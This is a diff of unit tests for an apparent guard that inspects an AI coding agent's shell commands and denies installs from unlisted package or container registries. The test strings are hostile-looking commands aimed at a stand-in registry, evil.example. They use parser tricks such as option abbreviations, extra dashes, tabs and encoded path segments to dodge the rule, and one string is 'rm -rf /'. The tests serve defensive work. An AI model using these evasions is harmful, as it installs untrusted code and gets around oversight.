@@ -253,7 +253,8 @@ class RegistryTargetTests(unittest.TestCase):
         self.assertIn((REGISTRY, "ghcr.io/evil/app"), targets("podman run --new-flag ghcr.io/evil/app"))
         self.assertIn((REGISTRY, "ghcr.io/evil/app"), targets("podman run --new-option value ghcr.io/evil/app"))
         # Each (position, readings left) is walked once: thousands of unknown options stay linear, not cubic.
-        self.assertEqual(targets("podman run " + "--zz " * 5000 + "ghcr.io/evil/app"), [(REGISTRY, "ghcr.io/evil/app")])
+        # Past three such options the image may be elsewhere, so the command is also unknown.
+        self.assertEqual(targets("podman run " + "--zz " * 5000 + "ghcr.io/evil/app"), [(REGISTRY, "ghcr.io/evil/app"), (UNKNOWN, None)])
         for command in ("uv publish --index internal", "uv publish", "uv python install -i pydir 3.12", "uv init --name x",
                         "docker run --rm alpine echo ghcr.io/x/y", "docker run ubuntu", "docker run --help",
                         "docker container ls", "podman run --rootfs /srv/root sh"):
@@ -300,6 +301,135 @@ class RegistryTargetTests(unittest.TestCase):
         self.assertEqual(targets("cat > .env <<'EOF'\nPIP_INDEX_URL=https://evil.example/simple\nEOF"),
                          [(REGISTRY, "evil.example/simple")])
         self.assertEqual(targets("echo 'PIP_INDEX_URL=https://evil.example/simple' > .env"), [])
+
+    # Second review of PR #135 (564d238).
+
+    def test_pips_hidden_pypi_url_alias(self):
+        url = "https://evil.example/simple"
+        for command in ("pip install --pypi-url %s x", "pip install --pyp %s x", "pip install --pypi=%s x",
+                        "python -m pip download --pypi-url=%s x", "PIP_PYPI_URL=%s pip install x",
+                        "export PIP_PYPI_URL=%s", "pip config set global.pypi-url %s", "pip config set install.PYPI_URL %s"):
+            command = command % url
+            with self.subTest(command=command):
+                self.assertEqual(targets(command), [(REGISTRY, "evil.example/simple")])
+        # --py is ambiguous in pip (--python, --python-version), and --python is its own option.
+        for command in ("pip install --python /usr/bin/python3 x", "pip install --python-version 3.12 --target t x"):
+            with self.subTest(command=command):
+                self.assertEqual(targets(command), [])
+
+    def test_npm_options_with_any_number_of_leading_dashes(self):
+        # nopt strips the dashes: npm reads each of these as --registry or --@acme:registry.
+        for command in ("npm install -registry https://evil.example/ left-pad", "npm install -regi https://evil.example/ left-pad",
+                        "npm install -regis=https://evil.example/ left-pad", "npm install ---registry https://evil.example/ left-pad",
+                        "npm install ---reg=https://evil.example/ left-pad", "npm install -@acme:registry=https://evil.example/ @acme/x",
+                        "npx -registry https://evil.example/ cowsay", "pnpm install -registry https://evil.example/",
+                        "npm install --reg https://evil.example/ left-pad", "npm install -reg https://evil.example/ left-pad",
+                        "npm --registry=https://evil.example/ config set fund false"):
+            with self.subTest(command=command):
+                self.assertEqual(targets(command), [(REGISTRY, "evil.example")])
+        for command in ("npm install -r x", "npm install --re x", "npm run build -- --registry-like", "npm run -registry-like",
+                        "npm install -g x"):
+            with self.subTest(command=command):
+                self.assertEqual(targets(command), [])
+
+    def test_tabs_and_newlines_inside_a_url_are_removed_first(self):
+        # A WHATWG parser (npm, uv) removes them anywhere in the URL: `.<TAB>.` is `..` (npm fetched /x/left-pad).
+        for command in ("NPM_CONFIG_REGISTRY='https://registry.example.org/simple/.\t./x' npm install left-pad",
+                        "uv pip install -i 'https://registry.example.org/simple/.\t./x' left-pad",
+                        "npm install --registry 'https://registry.example.org/simple/.\n./x' left-pad",
+                        "npm install --registry 'https://registry.example.org/simple/.\r./x' left-pad"):
+            with self.subTest(command=command):
+                self.assertEqual(targets(command), [(REGISTRY, "registry.example.org/x")])
+        self.assertEqual(targets("npm install --registry 'https://registry.example.org/sim\tple' x"),
+                         [(REGISTRY, "registry.example.org/simple")])
+        # Any other control character in a segment leaves the host alone.
+        self.assertEqual(targets("npm install --registry 'https://registry.example.org/simple/.\x0b./x' y"),
+                         [(REGISTRY, "registry.example.org")])
+        # A list split on whitespace by pip and on spaces by uv: both readings.
+        self.assertEqual(targets("UV_EXTRA_INDEX_URL='https://registry.example.org/simple/.\t./x' uv sync"),
+                         [(REGISTRY, "registry.example.org/simple"), (REGISTRY, "registry.example.org/x")])
+
+    def test_percent_escapes_are_decoded_unless_they_could_escape(self):
+        cases = {
+            "https://registry.example.org/simple/My%20Project/x": "registry.example.org/simple/my project/x",
+            "https://registry.example.org/%41pi/simple": "registry.example.org/api/simple",
+            # These may be read as `..`, a separator or another escape: only the host remains.
+            "https://registry.example.org/simple/%2e%2e/x": "registry.example.org",
+            "https://registry.example.org/simple/%2e/x": "registry.example.org",
+            "https://registry.example.org/simple/%252e%252e/x": "registry.example.org",
+            "https://registry.example.org/simple/a%2fb": "registry.example.org",
+            "https://registry.example.org/simple/a%5cb": "registry.example.org",
+            "https://registry.example.org/simple/a%3bb": "registry.example.org",
+            "https://registry.example.org/simple/a%00b": "registry.example.org",
+        }
+        for url, name in cases.items():
+            with self.subTest(url=url):
+                self.assertEqual(targets("pip install -i '%s' x" % url), [(REGISTRY, name)])
+
+    def test_pip_config_with_its_own_options_before_set(self):
+        for options in ("--timeout 30", "--log /tmp/l", "--proxy http://p:1", "--cert c.pem", "--cache-dir /tmp/c",
+                        "--ed vim", "--editor=vim", "--user", "--global --timeout=3"):
+            command = "pip config %s set global.index-url https://evil.example/simple" % options
+            with self.subTest(command=command):
+                self.assertEqual(targets(command), [(REGISTRY, "evil.example/simple")])
+        self.assertEqual(targets("pip config set global.index-url https://evil.example/simple --user"),
+                         [(REGISTRY, "evil.example/simple")])
+        self.assertEqual(targets("pip config --timeout 30 set global.index-url"), [(UNKNOWN, None)])
+        self.assertEqual(targets("pip config --timeout 30 get global.index-url"), [])
+
+    def test_npm_config_keys_anywhere_after_set(self):
+        for command in ("npm config set -L user registry https://evil.example/", "npm config set --location user registry https://evil.example/",
+                        "npm config --location=user set registry https://evil.example/",
+                        "npm config set fund false registry https://evil.example/", "npm config set fund=false registry=https://evil.example/"):
+            with self.subTest(command=command):
+                self.assertEqual(targets(command), [(REGISTRY, "evil.example")])
+
+    def test_an_unquoted_command_substitution_in_docker_run_is_unknown(self):
+        # Known limit, pinned so that fixing it is deliberate: destructive._tokens cuts the command at an unquoted `$(`,
+        # so the run has no image and is unknown, which fires the rule. When the splitter reads command substitutions,
+        # these name Docker Hub images (no registry) and should give [] like the quoted form below.
+        for command in ("docker run --rm -it -v $(pwd):/app -w /app node:20 npm install",
+                        "docker run --rm -u $(id -u):$(id -g) -v \"$PWD\":/w python:3.12 python -V",
+                        "podman run --rm -v $(pwd):/w:Z fedora:40 ls"):
+            with self.subTest(command=command):
+                self.assertEqual(targets(command), [(UNKNOWN, None)])
+        self.assertEqual(targets('docker run --rm -it -v "$(pwd)":/app -w /app node:20 npm install'), [])
+
+    def test_runner_options_after_one_the_reader_does_not_know(self):
+        url = "https://evil.example/simple"
+        for command in ("uvx --no-build-isolation-package foo --index-url %s ruff",
+                        "uv run --no-build-isolation-package foo --index-url %s python x.py",
+                        "uvx --new-option foo --index-url %s ruff", "uv run --new-option foo --index %s python x.py",
+                        "uv run -w requests python -m pip install -i %s x"):
+            command = command % url
+            with self.subTest(command=command):
+                self.assertIn((REGISTRY, "evil.example/simple"), targets(command))
+        # Past three such options the command may start anywhere: unknown, and the readings that were made.
+        self.assertIn((UNKNOWN, None), targets("uv run --a 1 --b 2 --c 3 --d 4 pip install x"))
+        self.assertNotIn((UNKNOWN, None), targets("uv run --a 1 --b 2 --c 3 pip install x"))
+
+    def test_more_container_global_options_and_windows_names(self):
+        for command in ("podman --db-backend sqlite pull evil.example/x:1", "podman --runtime-flag x pull evil.example/x:1",
+                        "podman --cdi-spec-dir d pull evil.example/x:1", "podman --out f pull evil.example/x:1",
+                        "docker --new-global-option v pull evil.example/x:1", "docker.exe pull evil.example/x:1"):
+            with self.subTest(command=command):
+                self.assertEqual(targets(command), [(REGISTRY, "evil.example/x")])
+        for command in ("pip.exe install -i https://evil.example/simple x", "python.exe -m pip install -i https://evil.example/simple x",
+                        "gem --config-file x install y -s https://evil.example/simple"):
+            with self.subTest(command=command):
+                self.assertEqual(targets(command), [(REGISTRY, "evil.example/simple")])
+
+    def test_env_passes_on_names_the_shell_refuses(self):
+        # env takes every NAME=VALUE before the command; npm reads npm_config_@scope:registry from it.
+        self.assertEqual(targets("env 'npm_config_@acme:registry=https://evil.example/' npm install @acme/x"), [(REGISTRY, "evil.example")])
+        self.assertEqual(targets("env 'A-B=x/y' npm install --registry https://evil.example/ x"), [(REGISTRY, "evil.example")])
+        seen: list = []
+        self.assertEqual(list(_simple_commands("env 'A-B=x/y' rm -rf /", assignments=seen)), [["rm", "-rf", "/"]])
+        self.assertEqual(seen, ["A-B=x/y"])
+
+    def test_a_network_path_reference_is_unknown_where_only_a_url_is_taken(self):
+        self.assertEqual(targets("npm install --registry //evil.example/simple x"), [(UNKNOWN, None)])
+        self.assertEqual(targets("pip install -f //server/wheels x"), [])  # find-links: a path
 
     def test_no_deprecation_warning(self):
         # re.split's maxsplit passed by position warns on Python 3.13+.
@@ -404,6 +534,43 @@ class HookDecisionTests(unittest.TestCase):
 
     def test_every_registry_must_be_covered(self):
         self.assertEqual(self.effect("pip install -i https://pypi.example.org/simple --extra-index-url https://pypi.org/simple x"), "deny")
+
+    def test_second_review_findings_fire(self):
+        values = ("registry.npmjs.org", "registry.example.org/simple", "pypi.org/simple")
+        for command in ("npm install -registry https://evil.example/ left-pad", "pip install --pypi-url https://evil.example/simple x",
+                        "NPM_CONFIG_REGISTRY='https://registry.example.org/simple/.\t./x' npm install left-pad",
+                        "pip config --timeout 30 set global.index-url https://evil.example/simple",
+                        "uvx --no-build-isolation-package foo --index-url https://evil.example/simple ruff",
+                        "npm config set -L user registry https://evil.example/",
+                        "docker run --rm -it -v $(pwd):/app -w /app node:20 npm install"):  # the pinned known limit
+            with self.subTest(command=command):
+                self.assertEqual(self.effect(command, values=values), "deny")
+        for command in ("npm install -registry https://registry.npmjs.org/ left-pad",
+                        "pip install --pypi-url https://pypi.org/simple x",
+                        'docker run --rm -it -v "$(pwd)":/app -w /app node:20 npm install'):
+            with self.subTest(command=command):
+                self.assertEqual(self.effect(command, values=values), "none")
+
+    def test_the_readers_share_one_split(self):
+        # A long command is split once for the deploy, registry and account readers, not once per kind.
+        import catpilot_guard.deploy_targets as dt
+        import catpilot_guard.registry_targets as rt
+        calls = {"shared": 0, "deploy": 0}
+
+        def counting(key, real):
+            def wrapper(*args, **kwargs):
+                calls[key] += 1
+                return real(*args, **kwargs)
+            return wrapper
+
+        extra = ({"id": "hosts", "kind": "deploy_host", "mode": "block", "values": ["*.vercel.app"]},
+                 {"id": "accounts", "kind": "cloud_account", "mode": "block", "values": ["aws:111122223333"]})
+        with mock.patch.object(rt, "_simple_commands", counting("shared", rt._simple_commands)), \
+                mock.patch.object(dt, "_simple_commands", counting("deploy", dt._simple_commands)):
+            result = cr.decide(bash("npm install --registry https://registry.npmjs.org/ x && vercel --prod"), "claude-code",
+                               policy(extra=extra))
+        self.assertEqual(result["hookSpecificOutput"]["permissionDecision"], "deny")
+        self.assertEqual(calls, {"shared": 1, "deploy": 0})
 
     def test_parser_differences_and_path_escapes_fire(self):
         # Review of PR #135: each of these reached a registry the rule does not list.
